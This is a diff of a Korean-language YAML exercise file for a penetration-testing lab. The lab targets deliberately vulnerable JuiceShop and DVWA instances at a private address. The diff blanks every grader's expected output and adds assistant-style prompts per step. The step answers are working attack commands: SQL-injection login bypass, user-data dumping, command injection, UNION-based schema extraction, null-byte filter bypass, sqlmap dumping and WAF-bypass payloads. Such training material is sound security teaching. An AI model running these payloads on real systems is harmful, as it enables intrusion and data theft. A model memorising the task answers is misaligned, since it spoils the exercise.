@@ -21,188 +21,166 @@ steps:
   answer_detail: 침투 테스트의 첫 단계는 대상의 공격 표면을 파악하는 것입니다. nmap -sV로 서비스 버전을 식별하면 CVE 데이터베이스에서 알려진 취약점을 검색할 수 있습니다. 80(Apache+ModSecurity), 3000(JuiceShop), 8080(DVWA)이 주요 대상입니다.
   verify:
     type: output_contains
-    expect: open
+    expect: 
     field: stdout
   target_vm: attacker
   script: nmap -sV -p 22,80,443,3000,3306,5432,6379,8080,8443,9200 10.20.30.80 2>/dev/null
   risk_level: low
+  bastion_prompt: nmap으로 대상 서버(10.20.30.80)의 열린 포트와 서비스 버전을 스캔해줘
 - order: 2
   instruction: 웹 애플리케이션 지문 수집(Fingerprinting)을 수행하시오. 각 포트의 서버 소프트웨어, 프레임워크, 기술 스택을 파악하라.
   hint: 각 포트에 curl -sI로 응답 헤더를 확인하고, HTML 소스에서 프레임워크 단서를 찾으세요.
   category: recon
   points: 8
-  answer: echo '=== Fingerprinting ===' && echo '[Port 80]'; curl -sI http://10.20.30.80:80 | grep -iE '(server|x-powered|x-frame)'; echo '[Port 3000 - JuiceShop]'; curl -sI http://10.20.30.80:3000 | grep
-    -iE '(server|x-powered)'; curl -s http://10.20.30.80:3000 | grep -oiE '(angular|express|node|jquery)' | sort -u; echo '[Port 8080 - DVWA]'; curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)';
+  answer: echo '=== Fingerprinting ===' && echo '[Port 80]'; curl -sI http://10.20.30.80:80 | grep -iE '(server|x-powered|x-frame)'; echo '[Port 3000 - JuiceShop]'; curl -sI http://10.20.30.80:3000 | grep -iE '(server|x-powered)'; curl -s http://10.20.30.80:3000 | grep -oiE '(angular|express|node|jquery)' | sort -u; echo '[Port 8080 - DVWA]'; curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)';
     echo '=== Fingerprint Complete ==='
   answer_detail: 지문 수집은 대상의 기술 스택을 파악하여 적절한 공격 벡터를 선택하는 데 중요합니다. JuiceShop은 Node.js/Express/Angular, DVWA는 PHP/Apache 기반입니다. 각 기술별로 특화된 공격 기법이 다릅니다.
   verify:
     type: output_contains
-    expect: Fingerprint Complete
+    expect: 
     field: stdout
   target_vm: attacker
-  script: echo '=== Fingerprinting ===' && echo '[Port 80]'; curl -sI http://10.20.30.80:80 | grep -iE '(server|x-powered|x-frame)'; echo '[Port 3000 - JuiceShop]'; curl -sI http://10.20.30.80:3000 | grep
-    -iE '(server|x-powered)'; curl -s http://10.20.30.80:3000 | grep -oiE '(angular|express|node|jquery)' | sort -u; echo '[Port 8080 - DVWA]'; curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)';
+  script: echo '=== Fingerprinting ===' && echo '[Port 80]'; curl -sI http://10.20.30.80:80 | grep -iE '(server|x-powered|x-frame)'; echo '[Port 3000 - JuiceShop]'; curl -sI http://10.20.30.80:3000 | grep -iE '(server|x-powered)'; curl -s http://10.20.30.80:3000 | grep -oiE '(angular|express|node|jquery)' | sort -u; echo '[Port 8080 - DVWA]'; curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)';
     echo '=== Fingerprint Complete ==='
   risk_level: low
+  bastion_prompt: 웹 애플리케이션 지문 수집(Fingerprinting)을 수행해줘
 - order: 3
   instruction: JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감 정보를 탈취하시오.
   hint: admin@juice-sh.op'-- 로 로그인한 후, /api/Users/ 엔드포인트에서 사용자 데이터를 추출하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))" 2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User Data Exfil ===''
-    && curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  ) for u in json.load(sys.stdin).get(''data'',[])]"
-    2>/dev/null | head -10'
+  answer: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))" 2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User
+    Data Exfil ==='' && curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  ) for u in json.load(sys.stdin).get(''data'',[])]" 2>/dev/null | head -10'
   answer_detail: '킬체인 1단계: SQL Injection으로 인증 우회 후 관리자 권한 획득. 2단계: 관리자 토큰으로 API에서 전체 사용자 정보(이메일, 패스워드 해시)를 탈취. 실전에서는 이 해시를 hashcat/john으로 크래킹합니다.'
   verify:
     type: output_contains
-    expect: Admin token
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))" 2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User Data Exfil ===''
-    && curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  ) for u in json.load(sys.stdin).get(''data'',[])]"
-    2>/dev/null | head -10'
+  script: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))" 2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User
+    Data Exfil ==='' && curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  ) for u in json.load(sys.stdin).get(''data'',[])]" 2>/dev/null | head -10'
   risk_level: medium
+  bastion_prompt: JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감 정보를 탈취해줘
 - order: 4
   instruction: DVWA에서 Command Injection으로 서버 내부 정보를 수집하시오. 네트워크 인터페이스와 실행 중인 프로세스를 확인하라.
   hint: security=low에서 ip 파라미터에 세미콜론으로 ifconfig, ps aux 등을 연결하세요.
   category: exploit
   points: 12
-  answer: curl -s -c /tmp/dvwa_final.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt
-    -b 'security=low' --data-urlencode 'ip=127.0.0.1; ip addr show | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE 'inet [0-9./]+' | head -5; echo '=== Process List
-    ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE '(root|www-data|mysql|node)[^
-    ]*.*' | head -8; echo '=== CMDi Complete ==='
+  answer: "curl -s -c /tmp/dvwa_final.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ip addr show \\\n | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE 'inet [0-9./]+' | head -5; echo '===\
+    \ Process List ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE '(root|www-data|mysql|node)[^ ]*.*' | head -8; echo '=== CMDi Complete ==='"
   answer_detail: Command Injection으로 내부 정보 수집(Post-Exploitation)을 수행합니다. 네트워크 인터페이스로 내부 네트워크 구조를, 프로세스 목록으로 실행 중인 서비스와 권한을 파악합니다.
   verify:
     type: output_contains
-    expect: Network Info
+    expect: 
     field: stdout
   target_vm: attacker
-  script: curl -s -c /tmp/dvwa_final.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt
-    -b 'security=low' --data-urlencode 'ip=127.0.0.1; ip addr show | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE 'inet [0-9./]+' | head -5; echo '=== Process List
-    ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE '(root|www-data|mysql|node)[^
-    ]*.*' | head -8; echo '=== CMDi Complete ==='
+  script: "curl -s -c /tmp/dvwa_final.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ip addr show \\\n | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE 'inet [0-9./]+' | head -5; echo '===\
+    \ Process List ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE '(root|www-data|mysql|node)[^ ]*.*' | head -8; echo '=== CMDi Complete ==='"
   risk_level: medium
+  bastion_prompt: DVWA에서 Command Injection으로 서버 내부 정보를 수집해줘
 - order: 5
   instruction: JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출하시오.
   hint: /rest/products/search?q= 파라미터에 UNION SELECT를 사용하세요. SQLite의 sqlite_master 테이블에서 스키마를 조회합니다.
   category: exploit
   points: 12
-  answer: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | python3
-    -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]" 2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
+  answer: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | python3 -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]" 2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
     | head -c 500
   answer_detail: UNION SELECT로 sqlite_master 테이블을 조회하면 전체 데이터베이스의 테이블 구조(CREATE TABLE 문)를 확인할 수 있습니다. Users, Cards, Wallets 등의 테이블 구조를 파악한 후 민감 데이터를 선택적으로 추출합니다.
   verify:
     type: output_contains
-    expect: DB Schema
+    expect: 
     field: stdout
   target_vm: attacker
-  script: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | python3
-    -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]" 2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
+  script: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | python3 -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]" 2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
     | head -c 500
   risk_level: medium
+  bastion_prompt: JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출해줘
 - order: 6
   instruction: JuiceShop의 /ftp 디렉터리에서 Null Byte Injection으로 접근 제한을 우회하여 민감 파일을 다운로드하시오.
   hint: /ftp 디렉터리의 파일 목록을 확인한 후, %2500(URL 인코딩된 Null Byte)으로 확장자 필터를 우회하세요.
   category: exploit
   points: 10
-  answer: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"'' | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' &&
-    curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'' && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w
+  answer: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"'' | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' && curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'' && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w
     ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/eastere.gg%2500.md'' && echo '''' && echo ''=== File Download Complete ==='''
   answer_detail: JuiceShop의 /ftp는 .md와 .pdf 확장자만 다운로드를 허용합니다. %2500은 URL 디코딩 후 %00(Null Byte)이 되어, 파일명이 file.bak%00.md로 해석됩니다. 확장자 검증은 .md로 통과하지만 OS는 %00에서 자르므로 .bak 파일에 접근합니다.
   verify:
     type: output_contains
-    expect: File Download Complete
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"'' | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' &&
-    curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'' && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w
+  script: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"'' | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' && curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'' && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w
     ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/eastere.gg%2500.md'' && echo '''' && echo ''=== File Download Complete ==='''
   risk_level: medium
+  bastion_prompt: JuiceShop의 /ftp 디렉터리에서 Null Byte Injection으로 접근 제한을 우회하여 민감 파일을 다운로드해줘
 - order: 7
   instruction: sqlmap을 사용하여 DVWA의 SQL Injection을 자동화하시오. users 테이블의 데이터를 추출하라.
   hint: sqlmap -u 'URL' --cookie='...' --batch --dump -T users 형태로 실행하세요.
   category: exploit
   points: 12
-  answer: SESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk '{print $NF}') && echo '=== sqlmap Automated SQLi ===' && sqlmap
-    -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID;security=low" --batch --dump -T users --threads=4 2>/dev/null | tail -20
+  answer: SESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk '{print $NF}') && echo '=== sqlmap Automated SQLi ===' && sqlmap -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID;security=low" --batch --dump -T users --threads=4 2>/dev/null | tail -20
   answer_detail: sqlmap은 SQL Injection 자동화 도구로, 취약점 탐지부터 데이터 추출까지 수행합니다. --batch는 모든 질문에 기본값 응답, --dump는 테이블 데이터 추출, -T는 특정 테이블 지정입니다.
   verify:
     type: output_regex
-    expect: sqlmap|fetched
+    expect: 
     field: stdout
   target_vm: attacker
-  script: SESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk '{print $NF}') && echo '=== sqlmap Automated SQLi ===' && sqlmap
-    -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID;security=low" --batch --dump -T users --threads=4 2>/dev/null | tail -20
+  script: SESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk '{print $NF}') && echo '=== sqlmap Automated SQLi ===' && sqlmap -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID;security=low" --batch --dump -T users --threads=4 2>/dev/null | tail -20
   risk_level: medium
+  bastion_prompt: sqlmap을 사용하여 DVWA의 SQL Injection을 자동화하시오. users 테이블의 데이터를 추출해줘
 - order: 8
   instruction: 취약점 체인을 구성하시오. SQLi(인증 우회) + BOLA(타 사용자 데이터) + Command Injection(서버 장악)을 연결하는 3단계 킬체인을 실행하라.
   hint: 1) SQLi로 로그인 -> 2) BOLA로 다른 사용자 장바구니 접근 -> 3) DVWA Command Injection으로 서버 정보 수집, 순차적으로 수행하세요.
   category: exploit
   points: 12
-  answer: 'echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi Auth Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
-    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "  Token: ${TOKEN:0:20}..."; echo ''[Phase 2] BOLA - Other User Data'' && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer
-    $TOKEN" | head -c 150; echo ''''; echo ''[Phase 3] Command Injection - System Info'' && curl -s -b /tmp/dvwa_final.txt -b ''security=low'' --data-urlencode ''ip=127.0.0.1; uname -a'' -d ''Submit=Submit''
-    http://10.20.30.80:8080/vulnerabilities/exec/ | grep -o ''Linux[^<]*'' | head -1; echo ''========== KILL CHAIN COMPLETE =========='''
+  answer: 'echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi Auth Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "  Token: ${TOKEN:0:20}..."; echo ''[Phase 2] BOLA - Other User Data'' && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $TOKEN" | head -c 150; echo ''''; echo ''[Phase 3] Command Injection - System Info'' && curl -s -b /tmp/dvwa_final.txt -b ''security=low'' --data-urlencode ''ip=127.0.0.1; uname -a'' -d ''Submit=Submit'' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -o ''Linux[^<]*'' | head -1; echo ''========== KILL CHAIN COMPLETE =========='''
   answer_detail: 취약점 체인(Kill Chain)은 개별 취약점을 연결하여 더 큰 영향을 만드는 기법입니다. SQLi로 초기 접근 -> BOLA로 데이터 수집 -> Command Injection으로 서버 장악. 각 취약점은 Medium 수준이지만, 연결하면 Critical 영향(전체 시스템 탈취)이 됩니다.
   verify:
     type: output_contains
-    expect: KILL CHAIN COMPLETE
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi Auth Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}''
-    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "  Token: ${TOKEN:0:20}..."; echo ''[Phase 2] BOLA - Other User Data'' && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer
-    $TOKEN" | head -c 150; echo ''''; echo ''[Phase 3] Command Injection - System Info'' && curl -s -b /tmp/dvwa_final.txt -b ''security=low'' --data-urlencode ''ip=127.0.0.1; uname -a'' -d ''Submit=Submit''
-    http://10.20.30.80:8080/vulnerabilities/exec/ | grep -o ''Linux[^<]*'' | head -1; echo ''========== KILL CHAIN COMPLETE =========='''
+  script: 'echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi Auth Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "  Token: ${TOKEN:0:20}..."; echo ''[Phase 2] BOLA - Other User Data'' && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $TOKEN" | head -c 150; echo ''''; echo ''[Phase 3] Command Injection - System Info'' && curl -s -b /tmp/dvwa_final.txt -b ''security=low'' --data-urlencode ''ip=127.0.0.1; uname -a'' -d ''Submit=Submit'' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -o ''Linux[^<]*'' | head -1; echo ''========== KILL CHAIN COMPLETE =========='''
   risk_level: medium
+  bastion_prompt: 취약점 체인을 구성하시오. SQLi(인증 우회) + BOLA(타 사용자 데이터) + Command Injection(서버 장악)을 연결하는 3단계 킬체인을 실행해줘
 - order: 9
   instruction: WAF(ModSecurity)를 우회하여 포트 80을 통한 공격이 가능한지 검증하시오. 다양한 우회 기법을 종합적으로 적용하라.
   hint: 이중 인코딩, 대소문자 혼합, HTTP 메서드 변조, Content-Type 변경 등을 조합하여 테스트하세요.
   category: exploit
   points: 10
-  answer: 'echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' "http://10.20.30.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[Double
-    Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?id=1%2527+OR+1%253D1--'' && echo '''' && echo -n ''[JSON Body] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    -X POST http://10.20.30.80:80/ -H ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1"}'' && echo '''' && echo -n ''[SVG XSS] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Csvg+onload%3Dalert(1)%3E''
-    && echo '''' && echo ''=== WAF Bypass Test Complete ==='''
+  answer: 'echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' "http://10.20.30.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[Double Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?id=1%2527+OR+1%253D1--'' && echo '''' && echo -n ''[JSON Body] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:80/ -H ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1"}'' && echo '''' && echo -n ''[SVG XSS] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Csvg+onload%3Dalert(1)%3E'' && echo '''' && echo ''=== WAF Bypass Test Complete ==='''
   answer_detail: 실전 침투 테스트에서 WAF 우회는 필수 기술입니다. 단일 기법으로 우회되지 않으면 여러 기법을 조합합니다. JSON 인코딩으로 SQL 키워드를 감추거나, SVG 이벤트 핸들러로 XSS 필터를 우회하는 등의 기법이 있습니다.
   verify:
     type: output_contains
-    expect: WAF Bypass Test Complete
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' "http://10.20.30.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[Double
-    Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?id=1%2527+OR+1%253D1--'' && echo '''' && echo -n ''[JSON Body] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    -X POST http://10.20.30.80:80/ -H ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1"}'' && echo '''' && echo -n ''[SVG XSS] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Csvg+onload%3Dalert(1)%3E''
-    && echo '''' && echo ''=== WAF Bypass Test Complete ==='''
+  script: 'echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' "http://10.20.30.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[Double Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?id=1%2527+OR+1%253D1--'' && echo '''' && echo -n ''[JSON Body] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:80/ -H ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1"}'' && echo '''' && echo -n ''[SVG XSS] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Csvg+onload%3Dalert(1)%3E'' && echo '''' && echo ''=== WAF Bypass Test Complete ==='''
   risk_level: medium
+  bastion_prompt: WAF(ModSecurity)를 우회하여 포트 80을 통한 공격이 가능한지 검증해줘
 - order: 10
   instruction: 전체 침투 테스트 결과를 요약하는 보안 진단 보고서를 작성하시오. OWASP Top 10 매핑, CVSS 위험도, 조치 우선순위를 포함하라.
   hint: 각 취약점에 CVSS 기준 위험도를 부여하고, 재현 방법과 조치 방안을 구체적으로 기술하세요.
   category: reporting
   points: 12
-  answer: "cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n  웹 애플리케이션 침투 테스트 보고서\n  대상: 10.20.30.80 (JuiceShop + DVWA + Apache)\n  수행일: 2026-04-06\n====================================================\n\
-    \n[1. 정보수집]\n- 오픈 포트: 80(Apache+ModSecurity), 3000(JuiceShop/Node.js), 8080(DVWA/PHP)\n- 기술스택: Node.js/Express/Angular, PHP/Apache, SQLite\n\n[2. 발견 취약점 - OWASP Top 10 매핑]\n\nCRITICAL (CVSS 9.0+):\n\
-    \  C-01: SQL Injection 인증 우회 (A03:Injection)\n    /rest/user/login email='or 1=1-- -> admin 토큰 획득\n  C-02: OS Command Injection (A03:Injection)\n    DVWA exec: ;id -> uid=33(www-data) 확인\n  C-03: UNION\
-    \ SELECT DB 스키마 탈취 (A03:Injection)\n    /rest/products/search?q= -> sqlite_master 전체 추출\n\nHIGH (CVSS 7.0-8.9):\n  H-01: BOLA - 타 사용자 장바구니 접근 (A01:Broken Access Control)\n  H-02: 과도한 데이터 노출 - 패스워드 해시\
-    \ (A01)\n  H-03: Mass Assignment - role/isAdmin 주입 (A01)\n  H-04: Null Byte Injection 파일 다운로드 우회 (A01)\n  H-05: 디렉터리 리스팅 /ftp/ 민감 파일 노출 (A05)\n\nMEDIUM (CVSS 4.0-6.9):\n  M-01: Rate Limiting 부재 (A07:Auth\
-    \ Failures)\n  M-02: 쿠키 보안 속성 미설정 (A07)\n  M-03: CORS 설정 오류 (A05:Misconfiguration)\n  M-04: 서버 배너 정보 노출 (A05)\n\n[3. Kill Chain 시연]\n  SQLi -> Admin Token -> BOLA(User Data) -> CMDi(Server Access)\n\
-    \  개별 Medium 취약점들이 연결되어 Critical 영향 발생\n\n[4. 방어 현황]\n  ModSecurity CRS: SQLi/XSS/CMDi/LFI 기본 차단 정상\n  우회 가능성: HPP, 일부 인코딩 기법에서 부분 우회\n\n[5. 조치 우선순위]\n  1순위: Prepared Statement 적용 (C-01, C-03)\n  2순위:\
-    \ shell_exec() 제거 + 입력 화이트리스트 (C-02)\n  3순위: RBAC + 객체 소유권 검증 (H-01~H-03)\n  4순위: 디렉터리 리스팅 비활성 + 파일 접근 제한 (H-05)\n  5순위: Rate Limiting + MFA + 쿠키 보안 (M-01~M-02)\n====================================================\n\
-    EOF\ncat /tmp/pentest_report.txt"
